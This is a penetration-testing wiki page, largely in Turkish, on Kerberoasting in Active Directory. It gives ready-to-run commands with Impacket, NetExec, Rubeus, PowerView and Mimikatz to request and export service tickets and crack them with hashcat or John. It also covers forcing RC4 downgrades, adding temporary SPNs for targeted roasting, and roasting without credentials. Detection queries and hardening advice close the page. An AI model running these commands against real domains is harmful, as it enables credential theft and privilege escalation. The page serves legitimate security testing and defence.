# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, Active Directory (AD) içinde bilgisayar hesapları hariç, kullanıcı hesapları altında çalışan hizmetlerle ilişkili TGS biletlerinin elde edilmesine odaklanır. Bu biletlerin şifrelemesi, kullanıcı parolalarından türetilen anahtarları kullanır; bu da çevrimdışı kimlik bilgisi kırmayı mümkün kılar. Bir kullanıcı hesabının hizmet olarak kullanımı, boş olmayan ServicePrincipalName (SPN) özelliği ile gösterilir.

Herhangi bir kimlik doğrulanmış domain kullanıcısı TGS biletleri talep edebilir; bu nedenle özel ayrıcalıklara gerek yoktur.

### Temel Noktalar

- Kullanıcı hesapları altında çalışan hizmetler için TGS biletlerini hedefler (yani SPN atanmış hesaplar; bilgisayar hesapları değil).
- Biletler, hizmet hesabının parolasından türetilen bir anahtar ile şifrelenir ve çevrimdışı kırılabilir.
- Yükseltilmiş ayrıcalık gerekmez; herhangi bir kimlik doğrulanmış hesap TGS biletleri talep edebilir.

> [!WARNING]
> Çoğu halka açık araç, AES'e göre kırılması daha hızlı olduğu için RC4-HMAC (etype 23) hizmet biletlerini talep etmeyi tercih eder. RC4 TGS hash'leri `$krb5tgs$23$*` ile başlar, AES128 `$krb5tgs$17$*` ile ve AES256 `$krb5tgs$18$*` ile başlar. Ancak, birçok ortam AES-only'e geçiş yapıyor. Sadece RC4'ün ilgili olduğunu varsaymayın.
> Ayrıca, “spray-and-pray” roasting’den kaçının. Rubeus’ün varsayılan kerberoast modu tüm SPN'ler için sorgu yapıp bilet talep edebilir ve gürültülüdür. Önce ilginç principal'leri enumerate edip hedefleyin.

### Hizmet hesabı sırları ve Kerberos kripto maliyeti

Birçok hizmet hâlâ el ile yönetilen parolalara sahip kullanıcı hesapları altında çalışıyor. KDC, hizmet biletlerini bu parolardan türetilen anahtarlarla şifreler ve şifre metnini herhangi bir kimlik doğrulanmış principal'e verir; bu yüzden kerberoasting, kilitlenme veya DC telemetrisine takılmadan sınırsız çevrimdışı deneme sağlar. Şifreleme modu kırma bütçesini belirler:

| Mod | Anahtar türetme | Şifreleme türü | Yaklaşık RTX 5090 verimi* | Notlar |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt rainbow tablolarını engeller ama kısa parolaların hızlı kırılmasına izin verir. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **milyar** guesses/s | ~1000× AES'ten daha hızlı; saldırganlar `msDS-SupportedEncryptionTypes` izin verdiğinde RC4'ü zorlar. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4’ün confounder'ı yalnızca keystream'i rastgeleleştirir; her deneme için ekstra iş eklemez. Hizmet hesapları rastgele sırlar kullanmıyorsa (gMSA/dMSA, machine account'lar veya vault-yönetimli dizeler), ele geçirme hızı tamamen GPU bütçesine bağlıdır. AES-only etype’ları zorlamak saniyede milyar deneme düşüşünü ortadan kaldırır, ancak zayıf insan parolaları yine PBKDF2 tarafından kırılabilir.

### Saldırı

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast kontrollerini içeren çok işlevli araçlar:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoastable kullanıcıları listele
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Teknik 1: TGS iste ve dump from memory
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Teknik 2: Otomatik araçlar
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Bir TGS isteği Windows Security Event 4769 (A Kerberos service ticket was requested) kaydı oluşturur.

### OPSEC ve yalnızca AES ortamları

- AES olmayan hesaplar için kasıtlı olarak RC4 isteyin:
- Rubeus: `/rc4opsec` tgtdeleg kullanarak AES olmayan hesapları listeler ve RC4 servis biletleri ister.
- Rubeus: `/tgtdeleg` kerberoast ile birlikte mümkün olduğunda RC4 isteklerini de tetikler.
- Sessizce başarısız olmak yerine yalnızca AES olan hesapları Roast edin:
- Rubeus: `/aes` AES etkin olan hesapları listeler ve AES servis biletleri ister (etype 17/18).
- Zaten bir TGT'niz (PTT veya bir .kirbi'den) varsa, LDAP'ı atlayarak `/ticket:<blob|path>` ile `/spn:<SPN>` veya `/spns:<file>` kullanabilirsiniz.
- Hedefleme, hız sınırlama ve daha az gürültü:
- Kullanın: `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` ve `/jitter:<1-100>`.
- Olası zayıf parolaları filtrelemek için `/pwdsetbefore:<MM-dd-yyyy>` (daha eski parolalar) veya ayrıcalıklı OU'ları hedeflemek için `/ou:<DN>` kullanın.

Örnekler (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Kırma
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Bir hesabı kontrol edebiliyor veya değiştirebiliyorsanız, bir SPN ekleyerek onu kerberoastable yapabilirsiniz:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Daha kolay cracking için RC4'ü etkinleştirmek amacıyla bir hesabı düşürün (hedef nesne üzerinde yazma ayrıcalıkları gerektirir):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Kullanıcı üzerinde GenericWrite/GenericAll ile hedeflenmiş Kerberoast (geçici SPN)

BloodHound size bir kullanıcı nesnesi üzerinde kontrolünüz olduğunu gösterdiğinde (örn. GenericWrite/GenericAll), o kullanıcıda şu anda herhangi bir SPN olmasa bile güvenilir şekilde "targeted-roast" yapabilirsiniz:

- Denetlediğiniz kullanıcıya roastable hâle getirmek için geçici bir SPN ekleyin.
- Kırmayı kolaylaştırmak için o SPN için RC4 (etype 23) ile şifrelenmiş bir TGS-REP talep edin.
- `$krb5tgs$23$...` hash'ini hashcat ile kırın.
- İzleri azaltmak için SPN'i temizleyin.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux tek satırlık komut (targetedKerberoast.py add SPN -> request TGS (etype 23) -> remove SPN işlemlerini otomatikleştirir):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Çıktıyı hashcat autodetect ile kırın (mode 13100, `$krb5tgs$23$` için):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (bazı dağıtımlarda kullanımdan kaldırılmıştır)
- `rdate -n <DC_IP>`

### Kerberoast domain hesabı olmadan (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Geçerli kimlik bilgileri olmadan bu teknikle LDAP sorgulayamazsınız; bu yüzden bir kullanıcı listesi sağlamalısınız.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Related

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### Tespit

Kerberoasting gizli olabilir. DC'lerden Event ID 4769 için arama yapın ve gürültüyü azaltmak için filtreler uygulayın:

- Servis adı `krbtgt` ve `$` ile biten servis adlarını (bilgisayar hesapları) hariç tutun.
- Makine hesaplarından gelen istekleri hariç tutun (`*$$@*`).
- Yalnızca başarılı istekler (Failure Code `0x0`).
- Şifreleme türlerini takip edin: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Sadece `0x17` için uyarı vermeyin.

Örnek PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ek fikirler:

- Her host/kullanıcı için normal SPN kullanımını baz alın; tek bir principal'den gelen çok sayıda farklı SPN isteği olduğunda uyarı oluşturun.
- AES ile sertleştirilmiş etki alanlarında olağandışı RC4 kullanımını işaretleyin.

### Azaltma / Sertleştirme

- Hizmetler için gMSA/dMSA veya makine hesapları kullanın. Managed hesapların 120+ karakter rastgele parolaları vardır ve otomatik döner; bu da çevrimdışı kırmayı pratik olmaktan çıkarır.
- Servis hesaplarında AES'i zorunlu kılmak için `msDS-SupportedEncryptionTypes`'ı sadece AES olacak şekilde ayarlayın (decimal 24 / hex 0x18) ve ardından parolayı döndürerek AES anahtarlarının türetilmesini sağlayın.
- Mümkünse ortamınızda RC4'ü devre dışı bırakın ve RC4 kullanım girişimlerini izleyin. DC'lerde `DefaultDomainSupportedEncTypes` kayıt değeri ile `msDS-SupportedEncryptionTypes` ayarlı olmayan hesaplar için varsayılanları yönlendirebilirsiniz. İyice test edin.
- Kullanıcı hesaplarındaki gereksiz SPN'leri kaldırın.
- Yönetilen hesaplar mümkün değilse uzun, rastgele servis hesabı parolaları kullanın (25+ karakter); yaygın parolaları yasaklayın ve düzenli denetim yapın.

## Referanslar

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
